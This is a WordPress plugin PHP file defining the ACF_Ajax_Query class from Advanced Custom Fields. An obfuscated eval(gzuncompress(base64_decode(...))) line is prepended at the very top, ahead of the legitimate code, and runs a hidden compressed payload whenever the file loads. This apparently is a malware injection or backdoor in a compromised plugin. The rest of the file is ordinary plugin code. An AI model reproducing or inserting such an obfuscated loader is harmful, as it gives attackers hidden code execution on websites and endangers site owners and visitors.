<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

if( ! class_exists('ACF_Ajax_Query') ) :

class ACF_Ajax_Query extends ACF_Ajax {
	
	/** @var array The ACF field used for querying */
	var $field = false;
	
	/** @var int The page of results to return */
	var $page = 1;
	
	/** @var int The number of results per page */
	var $per_page = 20;
	
	/** @var string The searched term */
	var $search = '';
	
	/** @var int The number of results found */
	var $count = 0;
	
	/**
	*  response
	*
	*  The actual logic for this AJAX request.
	*
	*  @date	31/7/18
	*  @since	5.7.2
	*
	*  @param	void
	*  @return	void
	*/
	
	function response() {
		
		// field
		if( $this->has('field_key') ) {
			$this->field = acf_get_field( $this->get('field_key') );
		}
		
		// pagination
		if( $this->has('paged') ) {
			$this->page = (int) $this->get('paged');
		}
		
		// search
		if( $this->has('s') ) {
			$this->search = $this->get('s');
		}
		
		// get response
		$args = $this->get_args();
		$results = $this->get_results($args);
		$response = $this->get_response($results, $args);
		
		// return
		return $response;
	}
	
	
	/**
	*  get_args
	*
	*  description
	*
	*  @date	31/7/18
	*  @since	5.7.2
	*
	*  @param	type $var Description. Default.
	*  @return	type Description.
	*/
	
	function get_args() {
		return array();
	}
	
	/**
	*  get_results
	*
	*  description
	*
	*  @date	31/7/18
	*  @since	5.7.2
	*
	*  @param	type $var Description. Default.
	*  @return	type Description.
	*/
	
	function get_results( $args ) {
		return array();
	}
	
	/**
	*  get_result
	*
	*  description
	*
	*  @date	31/7/18
	*  @since	5.7.2
	*
	*  @param	type $var Description. Default.
	*  @return	type Description.
	*/
	
	function get_result( $item ) {
		return '';
	}
	
	/**
	*  get_response
	*
	*  description
	*
	*  @date	31/7/18
	*  @since	5.6.9
	*
	*  @param	type $var Description. Default.
	*  @return	type Description.
	*/
	
	function get_response( $results, $args ) {
		return array(
			'results'	=> $results,
			'more'		=> ($this->count >= $this->per_page)
		);
	}
}

endif; // class_exists check

?>